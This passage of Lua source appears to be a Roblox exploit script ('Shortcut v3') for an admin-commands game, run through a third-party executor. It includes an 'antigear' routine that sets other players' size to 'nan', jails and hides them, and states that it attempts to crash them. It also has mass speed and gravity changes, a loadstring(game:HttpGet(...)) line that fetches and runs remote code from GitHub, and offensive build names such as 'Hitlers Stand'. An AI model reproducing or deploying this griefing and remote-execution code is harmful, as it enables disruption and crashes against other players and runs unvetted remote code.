				chatt("colorshifttop 600 400 10")
				chatt("colorshiftbottom 600 400 10")
				chatt("time 16")
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
				end
			elseif fmusic == 4 then
				chatt("music "..antilog.."5410085763");wait()
				chatt(("outdoorambient 255 255 255"))
				chatt(("fogend 2000"))
				chatt(("time 7"))
				chatt("h/ TIME TO DANCE!!!!")
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
					--chatt("h/ TIME TO DANCE!!!!")
				end
			elseif fmusic == 5 then
				chatt("music "..antilog.."9048375035");wait()
				chatt(("fogcolor 250 0 500"))
				chatt(("fogend 100"))
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
				end
			elseif fmusic == 6 then
				chatt("music "..antilog.."1846368080");wait()
				chatt(("fogcolor 250 0 500"))
				chatt(("fogend 1000"))
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
				end
			elseif fmusic == 7 then
				chatt("music "..antilog.."6823597327");wait()
				chatt("time 14")
				chatt(("fogcolor -300, -300, -300"))
				chatt(("fogend 360"))
				chatt("nograv all")
				chatt("speed all 19")
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
				end
			elseif fmusic == 8 then
				chatt("music "..antilog.."5410086218");wait()
				chatt("time -")
				chatt(("fogcolor 255, 215, 0"))
				chatt(("fogend 320"))
				chatt("speed all 19")
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
				end
			elseif fmusic == 9 then
				chatt("music "..antilog.."1847105373");wait()
				chatt(("outdoorambient 0 0 0"))
				chatt("time -")
				chatt(("fogcolor 0 0 0"))
				chatt(("fogend 250"))
				chatt("speed all 8")
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
				end
			elseif fmusic == 10 then
				chatt("music "..antilog.."1835924107");wait()
				chatt(("fogend 2000"))
				chatt(("time 8"))
				wait(1)
				mslash()
				for i = 1, 5 do
					regen();wait(5.1)
				end
			end -- No indenting belike
			--regen()
			perm = true
		else
			pass()
		end
	end
end)

task.spawn(function()
	while poweronly do
		local fFileName = "safemode.json"
		if writefile and readfile then
			local eExistingFile = pcall(readfile, fFileName)
			if not eExistingFile then
				longlogn("Delete the safemode.json file from your workspace folder to undo this")
				writefile(fFileName, '["check"]\n')
			end
		else
			shared.laggerdown = true
		end
	end
end)

if eExistingFile then
	shared.laggerdown = true
end

task.spawn(function()
	for i, Plr in pairs(game.Players:GetChildren()) do
		if Plr.Name ~= game.Players.LocalPlayer.Name then
			Plr.CharacterAdded:Connect(function()
				game.Players[Plr.Name].Backpack.ChildAdded:connect(function()
					if antigear then
						chatt('noclip ' .. Plr.Name)
						chatt('size ' .. Plr.Name .. ' nan')
						chatt("invis " .. Plr.Name)
						task.wait(.1)
						regen()
					end
				end)
			end)
			game.Players[Plr.Name].Backpack.ChildAdded:connect(function()
				if antigear then
					chatt('noclip ' .. Plr.Name)
					chatt('size ' .. Plr.Name .. ' nan')
					chatt("jail " .. Plr.Name)
					chatt("invis " .. Plr.Name)
					task.wait(.1)
					regen()
				end
			end)
		end
	end
	game.Players.PlayerAdded:Connect(function(Plr)
		if Plr.Name ~= game.Players.LocalPlayer.Name then
			Plr.CharacterAdded:Connect(function()
				game.Players[Plr.Name].Backpack.ChildAdded:connect(function()
					if antigear then
						chatt('noclip ' .. Plr.Name)
						chatt('size ' .. Plr.Name .. ' nan')
						chatt("invis " .. Plr.Name)
						task.wait(.1)
						regen()
					end
				end)
			end)
			game.Players[Plr.Name].Backpack.ChildAdded:connect(function()
				if antigear then
					chatt('noclip ' .. Plr.Name)
					chatt('size ' .. Plr.Name .. ' nan')
					chatt("invis " .. Plr.Name)
					task.wait(.1)
					regen()
				end
			end)
		end
	end)
end)

workspace.DescendantAdded:Connect(function(child)
	if fpsboost then
		coroutine.wrap(function()
			if child:IsA('Explosion') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('ForceField') then
				if child.Parent:FindFirstChild('Poop') then
					game:GetService'RunService'.Heartbeat:Wait()
					child:Destroy()
				else
					child.Name = 'Poop'
				end
			elseif child:IsA('Sparkles') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			elseif child:IsA('Smoke') then
				game:GetService'RunService'.Heartbeat:Wait()
				child:Destroy()
			end
		end)()
	end
end)

local UserInputService = game:GetService("UserInputService")

UserInputService.WindowFocused:Connect(
	function()
		if tcheck == true then
			task.wait(1)
			chatt("unname "..antilog.." me " .. math.random(1, 55))
		end
	end)

UserInputService.WindowFocusReleased:Connect(
	function()
		if tcheck == true then
			chatt("health random 1")
			logn("Checking webcam...")
			chatt("name me AFK \n" .. game.Players.LocalPlayer.DisplayName)
		end
	end
)

function hook()
	human = plyrs.LocalPlayer.Character.Humanoid

	coroutine.wrap(function()
		human:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
			if antiSpeed then
				human.WalkSpeed = 16
			end
		end)
	end)()

	coroutine.wrap(function()
		plyrs.LocalPlayer.Character.DescendantAdded:Connect(function(i)
			if i.Name == "BodyForce" and antiSetgrav then
				local root = plyrs.LocalPlayer.Character.HumanoidRootPart
				i.Force = Vector3.new(0, 0, 0)
				repeat
					rns.Heartbeat:Wait()
				until i == nil
				root.Velocity = Vector3.new(0, 0, 0)
			elseif i.Name == "BodyPosition" and antiSetgrav then
				i:Destroy()
				root.Velocity = Vector3.new(0, 0, 0)
			end
		end)
	end)()
end
hook()

local con5344 =
	plyrs.LocalPlayer.CharacterAdded:connect(
		function(chr)
			wait()
			hook()
		end)
table.insert(connections, con5344)

local RunService = game:GetService("RunService")

RunService.RenderStepped:Connect(function()
	if ccolors == true then
		while ccolors do
			chatt(
				"fogcolor " ..
					tostring(math.random(0, 255)) ..
					" " .. tostring(math.random(0, 255)) .. " " .. tostring(math.random(0, 255))
			)
			task.wait(.65)
		end
	end
end)

pcall(function()
	local tags = {}
	local mods = {}
	local httpt = game:HttpGet("https://heaven-lover.up.railway.app/tags")
	httpt = game:GetService("HttpService"):JSONDecode(httpt)
	if httpt and not httpt.error then 
		tags = httpt.message
		for _, t in pairs(tags) do 
			table.insert(mods, t.username)
		end
	end
	function addtag(char) 
		pcall(function()
			if not table.find(mods, char.Name:lower()) then return end
			if char.Head:FindFirstChild("Tag") then char.Head.Tag:Destroy() end
			local bg = Instance.new("BillboardGui", char.Head)
			bg.Name = "Tag"
			local f = Instance.new("Frame", bg)
			local t = Instance.new("TextLabel", f)
			for i, ta in pairs(tags) do 
				if ta.username == char.Name:lower() then
					t.Text = ta.tag .. " " .. char.Name
					if ta.rainbow then 
						coroutine.wrap(function()
							while t do
								task.wait()
								t.TextColor3 = Color3.fromHSV((tick() % 5 / 5), 1, 1)
							end
						end)()
					end
					t.TextColor3 = Color3.new(0,0,0)
					if ta.color then 
						local colors = ta.color:split(",")
						t.TextColor3 = Color3.fromRGB(colors[1], colors[2], colors[3])
					end
				end
			end
			if not t.Text then return end
			bg.Size = UDim2.new(4,0,1,2)
			bg.SizeOffset = Vector2.new(0, 2)
			bg.Adornee = char.Head
			f.Size = UDim2.new(1,0,1,0)
			f.BackgroundTransparency = 1
			t.BackgroundTransparency = 1
			f.BorderSizePixel = 0
			t.BorderSizePixel = 0
			t.Size = UDim2.new(1,0,1,0)
			t.Font = Enum.Font.GothamMedium
			t.TextScaled = true;
		end)
	end

	coroutine.wrap(function() 
		while task.wait(0.5) do 
			for _, c in pairs(game.Workspace:GetChildren()) do 
				if game.Players:FindFirstChild(c.Name) then 
					addtag(c)
				end
			end
		end
	end)()
end)

wait(1)
game.Players:Chat("/reg") -- Function would error lmfao.
wait(.5)
perm = false

task.spawn(function()
	if shared.loadwithiy == true then
		if loadwithiyglobal == true then
			return print("Why?")
		end
		pcall(function()
			getgenv().loadwithiyglobal = true
		end)
		wait(.35)
		for i = 1, 5 do
			chatt(prefix.."infyield");wait(2.5)
		end
	end
	if shared.autorejoin == true then
		if ar2global == true then
			pass()
			return
		end
		pcall(function()
			getgenv().ar2global = true
		end)
		wait(15)
		chatt(prefix.."autorejoin")
	end
end)

-- Playerlist

task.spawn(function()
	local ld = 35748
	local function addsperm(plr)
		if string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. plr.UserId .. "/items/GamePass/" .. ld), ld) then

			print("This person named "..plr.name.." bought the Person's gamepass")

			warn("This person named "..plr.name.." bought the Person's gamepass")

			error("This person named "..plr.name.." bought the Person's gamepass")

			logn("This person named "..plr.name.." bought the Person's gamepass")

			game:GetService('TestService'):Message("This person named "..plr.name.." bought the Person's gamepass")
		end
	end

	for _, v in next, game.Players:GetPlayers() do
		if v.Name ~= game.Players.LocalPlayer.Name then
			addsperm(v)
		end
	end
end)

if shared.startupcommands == true then
	task.wait()
	if startupsglobal == true then
		pass()
		return
	end
	pcall(function()
		getgenv().startupsglobal = true
	end)
	chatt(prefix.."startup")
end

PlayerList = Instance.new("ScreenGui")

coroutine.wrap(function()
	-- Instances:

	local PlayerListMaster = Instance.new("Frame")
	local SizeOffsetFrame = Instance.new("Frame")
	local UIListLayout = Instance.new("UIListLayout")
	local ScrollingFrameContainer = Instance.new("Frame")
	local UIListLayout_2 = Instance.new("UIListLayout")

	--Properties:

	PlayerList.Name = "PlayerList"
	PlayerList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	PlayerList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	PlayerList.DisplayOrder = 1

	PlayerListMaster.Name = "PlayerListMaster"
	PlayerListMaster.Parent = PlayerList
	PlayerListMaster.AnchorPoint = Vector2.new(1, 0)
	PlayerListMaster.BackgroundTransparency = 1.000
	PlayerListMaster.Position = UDim2.new(1, -4, 0, 40)
	PlayerListMaster.Size = UDim2.new(0, 166, 0.1, 0)

	SizeOffsetFrame.Name = "SizeOffsetFrame"
	SizeOffsetFrame.Parent = PlayerListMaster
	SizeOffsetFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	SizeOffsetFrame.BackgroundTransparency = 1.000
	SizeOffsetFrame.Position = UDim2.new(0.5, 0, 0.881410241, 0)
	SizeOffsetFrame.Size = UDim2.new(1, 0, 2.5, 0) -- {1, 0},{3.003, 0}

	UIListLayout.Parent = SizeOffsetFrame
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

	ScrollingFrameContainer.Name = "ScrollingFrameContainer"
	ScrollingFrameContainer.Parent = SizeOffsetFrame
	ScrollingFrameContainer.BackgroundColor3 = Color3.fromRGB(31, 33, 35)
	ScrollingFrameContainer.BackgroundTransparency = 0.300
	ScrollingFrameContainer.BorderSizePixel = 0
	ScrollingFrameContainer.LayoutOrder = 3
	ScrollingFrameContainer.Position = UDim2.new(0, 0, 0.0145454546, 0)
	ScrollingFrameContainer.Size = UDim2.new(1, 0, 0.883456707, 40)

	UIListLayout_2.Parent = ScrollingFrameContainer
	UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

	-- Scripts:

	local function KTJYHGG_fake_script()
		local script = Instance.new("LocalScript", ScrollingFrameContainer)

		function addBox(isPerm, plrName, plrDisplay)
			local PlayerHere = Instance.new("Frame")
			local ChildrenFrame = Instance.new("Frame")
			local NameFrame = Instance.new("Frame")
			local DisplayName = Instance.new("Frame")
			local PlayerName = Instance.new("TextLabel")
			local SizeConstraint = Instance.new("UITextSizeConstraint")
			local PermUI = Instance.new("Frame")
			local PlayerName_2 = Instance.new("TextLabel")
			local SizeConstraint_2 = Instance.new("UITextSizeConstraint")
			local PlayerName_3 = Instance.new("Frame")
			local PlayerName_4 = Instance.new("TextLabel")
			local SizeConstraint_3 = Instance.new("UITextSizeConstraint")
			local Layout = Instance.new("UIListLayout")

			PlayerHere.Name = plrName
			PlayerHere.Parent = script.Parent
			PlayerHere.BackgroundTransparency = 1.000
			PlayerHere.ClipsDescendants = true
			PlayerHere.Size = UDim2.new(1, 0, 0.158816129, 0)

			ChildrenFrame.Name = "ChildrenFrame"
			ChildrenFrame.Parent = PlayerHere
			ChildrenFrame.BackgroundTransparency = 1.000
			ChildrenFrame.Size = UDim2.new(1, 0, 0, 40)

			NameFrame.Name = "NameFrame"
			NameFrame.Parent = ChildrenFrame
			NameFrame.BackgroundTransparency = 1.000
			NameFrame.Size = UDim2.new(0, 150, 0, 40)

			DisplayName.Name = "DisplayName"
			DisplayName.Parent = NameFrame
			DisplayName.BackgroundTransparency = 1.000
			DisplayName.LayoutOrder = 3
			DisplayName.Position = UDim2.new(0.0799999982, 0, 0, 0)
			DisplayName.Size = UDim2.new(0.639999986, -34, 1, 0)

			PlayerName.Name = "PlayerName"
			PlayerName.Parent = DisplayName
			PlayerName.BackgroundTransparency = 1.000
			PlayerName.Position = UDim2.new(0.439606011, 0, 0.704999983, 0)
			PlayerName.Size = UDim2.new(1, 0, 0.439999998, 0)
			PlayerName.Font = Enum.Font.GothamSemibold
			PlayerName.Text = plrDisplay
			PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
			PlayerName.TextScaled = true
			PlayerName.TextSize = 14.000
			PlayerName.TextWrapped = true
			PlayerName.TextXAlignment = Enum.TextXAlignment.Left

			SizeConstraint.Name = "SizeConstraint"
			SizeConstraint.Parent = PlayerName
			SizeConstraint.MaxTextSize = 14
			SizeConstraint.MinTextSize = 9

			PermUI.Name = "PermUI"
			PermUI.Parent = NameFrame
			PermUI.BackgroundTransparency = 1.000
			PermUI.LayoutOrder = 3
			PermUI.Position = UDim2.new(0.0799999982, 0, 0, 0)
			PermUI.Size = UDim2.new(0.446666658, -34, 1, 0)

			PlayerName_2.Name = "PlayerName"
			PlayerName_2.Parent = PermUI
			PlayerName_2.BackgroundTransparency = 1.000
			PlayerName_2.Position = UDim2.new(0, 0, 0.281, 0)
			PlayerName_2.Size = UDim2.new(1, 0, 0.439999998, 0)
			PlayerName_2.Font = Enum.Font.GothamSemibold
			PlayerName_2.Text = "    "
			if isPerm then
				PlayerName_2.Text = "Perm"
			end
			if isPersons then
				PlayerName_2.Text = "Perm\nPersons"
			end
			PlayerName_2.TextColor3 = Color3.fromRGB(255, 255, 255)
			PlayerName_2.TextScaled = true
			PlayerName_2.TextSize = 14.000
			PlayerName_2.TextWrapped = true
			PlayerName_2.TextXAlignment = Enum.TextXAlignment.Left

			SizeConstraint_2.Name = "SizeConstraint"
			SizeConstraint_2.Parent = PlayerName_2
			SizeConstraint_2.MaxTextSize = 14
			SizeConstraint_2.MinTextSize = 9

			PlayerName_3.Name = "PlayerName"
			PlayerName_3.Parent = NameFrame
			PlayerName_3.BackgroundTransparency = 1.000
			PlayerName_3.LayoutOrder = 3
			PlayerName_3.Size = UDim2.new(1, -34, 1, 0)

			PlayerName_4.Name = "PlayerName"
			PlayerName_4.Parent = PlayerName_3
			PlayerName_4.BackgroundTransparency = 1.000
			PlayerName_4.Position = UDim2.new(0.422413796, 0, 0.281, 0)
			PlayerName_4.Size = UDim2.new(1, 0, 0.439999998, 0)
			PlayerName_4.Font = Enum.Font.GothamSemibold
			PlayerName_4.Text = plrName
			PlayerName_4.TextColor3 = Color3.fromRGB(255, 255, 255)
			PlayerName_4.TextScaled = true
			PlayerName_4.TextSize = 14.000
			PlayerName_4.TextWrapped = true
			PlayerName_4.TextXAlignment = Enum.TextXAlignment.Left

			SizeConstraint_3.Name = "SizeConstraint"
			SizeConstraint_3.Parent = PlayerName_4
			SizeConstraint_3.MaxTextSize = 14
			SizeConstraint_3.MinTextSize = 9

			Layout.Name = "Layout"
			Layout.Parent = ChildrenFrame
			Layout.FillDirection = Enum.FillDirection.Horizontal
			Layout.SortOrder = Enum.SortOrder.Name
			Layout.VerticalAlignment = Enum.VerticalAlignment.Center
		end

		game.StarterGui:SetCoreGuiEnabled("PlayerList", false)

		game.Players.ChildRemoved:Connect(function(player)
			if script.Parent:FindFirstChild(player.Name) then
				script.Parent:FindFirstChild(player.Name):remove()
			end
		end)

		while task.wait(1) do
			for _, plr in pairs(game.Players:GetChildren()) do
				if not script.Parent:FindFirstChild(plr.Name) then
					addBox(hasGamepass(plr.UserId, 66254), plr.Name, plr.DisplayName)
					task.wait()
					--script.Parent.Size = UDim2.new(0, 166, 0, (#script.Parent:GetChildren() - 1) * 50)
				end
			end
		end
	end
	coroutine.wrap(KTJYHGG_fake_script)()
end
)()

-- // GUI \\ -- Also local variables ask for less memory
local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/M4Iw4reT3sts/scr4bl33/main/GUI"))()
local game_Name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)["Name"]
local main = lib:Window("Shortcut v3", "KAH", "discord.io", "shortcut")
local tab = main:Tab("Welcome")
local tab2 = main:Tab("Antis")
local tab3 = main:Tab("Building")
local tab4 = main:Tab("EMR")
local tab5 = main:Tab("Others")
local tab6 = main:Tab("Featured builds")

local lfb = tab3:Button("COMMUNITY BUILDS", function()
	logn("Press F9 \n Also check your clipboard")
	local ClientSound = Instance.new("Sound")
	ClientSound.SoundId = "http://www.roblox.com/asset/?id=5807619699"
	ClientSound.Volume = 1.5
	ClientSound.Parent = workspace
	ClientSound.PlaybackSpeed = 1
	ClientSound:Play();wait()
	createKohlsUi(
		{
			"--------------------Shortcut v3 --------------------",
			"-Community builds-",
			"-Open the console to view them-",
			"\n\n-Every build gets approved-\n Make sure the file is called savedthings.lua \n Located in | Workspace \n \n \n \n Credit: Funzysdeath"
		}
	)
	print("--------------------Shortcut v3 -------------------- \n Remaking the Shortcut v2 Build platform isn't allowed under any circumstances ©. Remaking our tools ''save/load'' or the build loader in-general requires credit to be given. \n We were the first to implement this but skids can't get their own ideas and started forking our open source parts and made their own btools out of it \n \n \n \n \n \n \n \n \n \n \n Size Rating: \n 1-4 = Tiny \n 5-11 = Small \n 12-19 = Medium \n 20-29 = Big \n 30+ = Large  60+ = :O badge, 100+ = ☆☆☆ badge, \n If paint is required then a''Requires manual'' owner note will be added under the build \n Types: Obby, Generic, Object, Recreation, Game Changer (RARE), Paint,\n \n Max 32 char (absolutely capped to the max) \n \n \n \n | Available builds |")
	print("Fixmap 1.0/2.0 - Stock")
	print("Bricks splitter - Stock (Makes it easier to move the building bricks as they're so close to each other which can result in bugs)")
	print("Horizontal pads fixer - Stock (This will fix all the pads correctly)\n")
	print("House blocker - Creator: Tech (702990207590596690) Size: Small, 5 parts, Type: Generic")
	print("obby pretty hard still i reuplo- Creator: Kozy (817032429918224414) Size: Big, 25 Parts, Type: Obby")
	print("blocks the obby with the bricks- Creator: Kozy (817032429918224414) Size: Small, 10 Parts, Type: Obby")
	print("cool parkour- Creator: Kozy (817032429918224414) Size: Medium, 12 Parts, Type: Obby")
	print("obby blocker v2- Creator: Kozy (817032429918224414) Size: Tiny, 3 Parts, Type: Generic")
	print("PvP Area- Creator: Damix (947582657481564190) Size: Medium, 13 Parts, Type: Recreation")
	print("dick- Creator: Damix (947582657481564190) Size: Small, 6 Parts, Type: Object")
	print("ahegao- Creator: Damix (947582657481564190) Size: Big, 28 Parts, Type: Reaction")
	print("small dance floor- Creator: Damix (947582657481564190) Size: Medium, 17 Parts, Type: Recreation")
	print("Jar- Creator: Damix (947582657481564190) Size: Small, 8 Parts, Type: Object")
	print("Hitlers Stand- Creator: Damix (947582657481564190) Size: Big, 27 Parts, Type: Recreation")
	print("obby for admin- Creator: Kozy (817032429918224414) Size: Medium, 17 Parts, Type: Obby")
	print("SCV2- Creator: Damix (947582657481564190) Size: Medium, 19 Parts, Type: Object")
	print("pads blocker- Creator: Kozy (817032429918224414) Size: Tiny, 3 Parts, Type: Generic")
	print("spawn blocker- Creator: Kozy (817032429918224414) Size: Small, 7 Parts, Type: Generic")
	print("Obby- Creator: Damix (947582657481564190) Size: Large, 62 Parts :O, Type: Obby")
	print("obbyandpadblocker- Creator: humanoid/me_kevin3050ti (924227593782308895) Size: Big, 21 Parts, Type: Obby")
	print("myobbysucks- Creator: Rick Astley/Deontae15508970 (748029205559771186) Size: Large, 41 Parts, Type: Obby")
	print("slide- Creator: Damix (947582657481564190) Size: Small, 9 Parts, Type: Generic")
	print("Invisible obby- Creator: Tech (702990207590596690) Size: Tiny, 1 Part, Type: Generic")
	print("fakeregen- Creator: Damix (947582657481564190) Size: Small, 5 Parts, Type: Recreation \n Requires manual ''paint to paint all parts to Bright violet'',")
	print("ofrad- Creator: Kozy (817032429918224414) Size: Large, 47 Parts, Type: Obby")
	print("ofrad v2- Creator: Kozy (817032429918224414) Size: Large, 68 Parts :O, Type: Obby")
	print("bad obby- Creator: quiving (611591635599622155) Size: Large, 86 Parts :O, Type: Obby")
	print("ihangpeople- Creator: Damix (947582657481564190) Size: Large, 37 Parts, Type: Generic")
	print("hut- Creator: Kozy (817032429918224414) Size: Large, 30 Parts, Type: Generic")
	print("umbrella- Creator: Kozy (817032429918224414) Size: Big, 23 Parts, Type: Object \n Requires manual paint to ''paint the bottom grey and top blue'',")
	print("obby blocker and padblocker- Creator: ダーク/me_blanky (812300369283121192) Size: Medium, 19 Parts, Type: Generic")
	print("insane room- Creator: Kozy (817032429918224414) Size: Large, NA Parts, Type: Generic \n Requires manual ''combine this with //blackout'',")
	print("improved insane room- Creator: Kozy (817032429918224414) Size: Large, 113 Parts ☆☆☆, Type: Generic")
	print("box template- Creator: Damix (947582657481564190) Size: Large, 52 Parts, Type: Generic")
	print("big hut- Creator: Kozy (817032429918224414) Size: Large, 64 Parts, Type: Generic")
	print("some obby i made with <@!433050- Creator: ダーク/me_blanky (812300369283121192) Size: Medium, 16 Parts, Type: Obby")
	print("Fake slot 1 perm pad dex- Creator: Tech__ (702990207590596690) Size: Tiny, 1 Part, Type: Recreation \n Requires manual ''paint it to bright green``")
	print("fake admin pad- Creator: Damix (947582657481564190) Size: Tiny, 1 Part, Type: Recreation")
	print("random build- Creator: Damix (947582657481564190) Size: Medium, 17 Part, Type: Generic")
	print("spawncage v2- Creator: ダーク/me_blanky (812300369283121192) Size: Small, 10 Parts, Type: Generic")
	print("house jail- Creator: 9etie (348183894677520394) Size: Medium, 15 Parts, Type: Generic")
	print("hardobbyforregen- Creator: whatjg (570661940633010186) Size: Big, 20 Parts, Type: Obby")
	print("cmdysmileyface- Creator: quiving (611591635599622155) Size: Big, 23 Parts, Type: Object")
	print("KAHObbyButSimple- Creator: Tech (702990207590596690) Size: Small, 7 Parts, Type: Obby")
	print("\n \n \n \n You have Shortcut v3 (Premium) sooo, you can get started by pressing K to get SS Btools. \n Also it's recommended to have infinite yield loaded up when you're gonna build \n Have fun building")
	setclipboard("Link to the Shortcut v3 build platform https://discord.com/channels/918344197201866782/981880266232590376/981883275297562684 You can load and publish your builds here")
	execCmd("partpath")
end)

local welcome = tab3:Label("You can get btools by pressing the keybind ''K''")

local line = tab3:line() -- Not causing overlap somehow.

local lfb = tab3:Button("Quickload", function()
	chatt(prefix.."quickload")
end)

local toggle = tab3:Toggle("Do not disturb (no sounds SS)", false, function(bool)
	if bool == true then
		loopstopsounds = true
	end
	if bool == false then
		loopstopsounds = false
	end
end)

local lfb = tab3:Button("Replace buildfile with Fix Map 3.0 (cannot be undone)", function()
	chatt(prefix.."fixmap")
	chatt(prefix.."kbmove")
	logn("Use the ''Load'' tool on moved map parts")
end)

local lfb = tab3:Button("Preview Build", function()
	chatt(prefix.."previewbuild")
end)

local lfb = tab3:Button("Reset colors (paintfix)", function()
	chatt(prefix.."fixpaint")
end)

local lfb = tab3:Button("Disable antigearv2", function()
	antigear = false
end)

local lfb = tab3:Button("Enable antigearv2", function()
	antigear = true
	longlogn("This will attempt to crash the user who received their gear. Credit to whatjg for making this")
end)

local lfb = tab6:Button("FEATURED Hitlers Stand (by Damix)", function()
	writefile("savedthings.lua", [[SmoothBlockModel93/-115, 3.70000076, 87, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel48/-115, 1.89999902, 73, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel85/-131, 3.700001, 60, 1, 0, 4.37113883e-08, 0, 1, 0, -4.37113883e-08, 0, 1
SmoothBlockModel205/-133, 6.20000172, 62, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel14/-115.800003, 5.70000744, 66, -1, -1.50995803e-07, 0, 1.13998666e-14, -7.54979013e-08, 1, -1.50995803e-07, 1, 7.54979013e-08
SmoothBlockModel105/-117, 5.50000048, 61.1999969, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel224/-130, 1.89999998, 71, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel113/-130, 1.89999807, 61, -4.37113883e-08, 0, -1, 0, 1, 0, 1, 0, -4.37113883e-08
SmoothBlockModel164/-130, 5.68000221, 73.1299973, 1, 0, 0, 0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08
SmoothBlockModel196/-115, 5.59999895, 81, -1, -1.50995803e-07, 0, 1.13998666e-14, -7.54979013e-08, 1, -1.50995803e-07, 1, 7.54979013e-08
SmoothBlockModel186/-130, 1.9000001, 85, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel134/-130, 1.79999995, 87, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel150/-125.5, 7.28000212, 77.3299942, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel66/-122.5, 7.29999971, 77.3000031, -4.37113883e-08, 0, 1, 0, 1, 0, -1, 0, -4.37113883e-08
SmoothBlockModel99/-121.5, 8.29999924, 67.3300018, -4.37113883e-08, -1, -1.19248806e-08, -4.37113883e-08, 1.19248824e-08, -1, 1, -4.37113883e-08, -4.37113883e-08
Part24/-121.800003, 6.89999962, 72.2299957, -4.37113883e-08, -1, 0, 1, -4.37113883e-08, 0, 0, 0, 1
Part44/-123.200005, 12.5, 72.2299957, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel38/-131.699997, 50.9000092, 71.3999863, -4.37113883e-08, -1, 0, -1, 4.37113883e-08, -1.50995803e-07, 1.50995803e-07, -6.60023616e-15, -1
SmoothBlockModel158/-128.800003, 16.2472115, 72.7813644, -4.37113883e-08, 0, 1, 0.707106888, 0.707106709, 3.09086232e-08, -0.707106709, 0.707106888, -3.09086161e-08
SmoothBlockModel202/-128.800003, 14.9744158, 74.0541611, -4.37113883e-08, 0, 1, 0.707106888, 0.707106709, 3.09086232e-08, -0.707106709, 0.707106888, -3.09086161e-08
SmoothBlockModel94/-128.800003, 24.3082275, 63.3061409, -4.37113883e-08, 0, 1, 0.70710659, -0.707106948, 3.0908609e-08, 0.707106948, 0.70710659, 3.09086268e-08
SmoothBlockModel177/-129.900009, 32.5813751, 70.4479218, -4.37113883e-08, 0, -1, -0.707106888, 0.707106709, 3.09086232e-08, 0.707106709, 0.707106888, -3.09086161e-08
SmoothBlockModel76/-130, 32.1571083, 88.4084244, -4.37113883e-08, 0, -1, -0.70710659, -0.707106948, 3.0908609e-08, -0.707106948, 0.70710659, 3.09086268e-08
SmoothBlockModel120/-128.800003, 29.9650764, 68.9629974, -4.37113883e-08, 0, 1, 0.70710659, -0.707106948, 3.0908609e-08, 0.707106948, 0.70710659, 3.09086268e-08
SmoothBlockModel156/-129.899994, 40.9252396, 62.2454758, -4.37113883e-08, 0, -1, -0.707106888, 0.707106709, 3.09086232e-08, 0.707106709, 0.707106888, -3.09086161e-08
SmoothBlockModel61/-129.899994, 40.9252319, 64.5082169, -4.37113883e-08, 0, -1, -0.70710659, -0.707106948, 3.0908609e-08, -0.707106948, 0.70710659, 3.09086268e-08
SmoothBlockModel124/-128.800003, 38.0968056, 79.4988861, -4.37113883e-08, 0, 1, 0.707106888, 0.707106709, 3.09086232e-08, -0.707106709, 0.707106888, -3.09086161e-08]])
end)

local lfb = tab6:Button("FEATURED SCV2 (by Damix)", function()
	writefile("savedthings.lua", [[Divider5/-96.5650024, 15.2299995, 28.2399998, -1, -1.50995803e-07, 0, -6.60023616e-15, 4.37113883e-08, -1, 1.50995803e-07, -1, -4.37113883e-08
SmoothBlockModel46/-96.965004, 14.0299988, 28.4430046, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
Divider7/-97.6436768, 14.051321, 28.2430038, -0.707106829, -1.06770166e-07, 0.707106709, -0.707106709, -6.30587564e-08, -0.707106829, 1.20087179e-07, -1, -3.09086197e-08
SmoothBlockModel7/-102.565002, 9.92999935, 28.4430046, 1, 0, 0, 0, 1, 0, 0, 0, 1
Divider6/-96.5650024, 8.22999954, 28.2430038, -1, 1.50995803e-07, -5.96046519e-08, 5.96046412e-08, -7.54979084e-08, -1, -1.50995803e-07, -1, 7.54979013e-08
SmoothBlockModel83/-110.065002, 9.63000107, 27.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel206/-103.065002, 12.4300003, 27.2430038, -1, -1.50995803e-07, 0, -1.50995803e-07, 1, -1.50995803e-07, 2.27997332e-14, -1.50995803e-07, -1
SmoothBlockModel27/-110.065002, 15.4300003, 27.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1
SmoothBlockModel4/-112.265961, 11.4800005, 27.2430038, -0.866025507, 0.499999821, -7.54979013e-08, 0.499999821, 0.866025507, -1.50995803e-07, -1.01147677e-08, -1.68515143e-07, -1
SmoothBlockModel10/-118.799042, 11.1500006, 27, 0.866025388, -0.5, 0, 0.5, 0.866025388, 0, 0, 0, 1
Part44/-124, 13.8000002, 27, 1, 0, 0, 0, 1, 0, 0, 0, 1
Part37/-125, 14.2999992, 27, 1, 0, 0, 0, 1, 0, 0, 0, 1
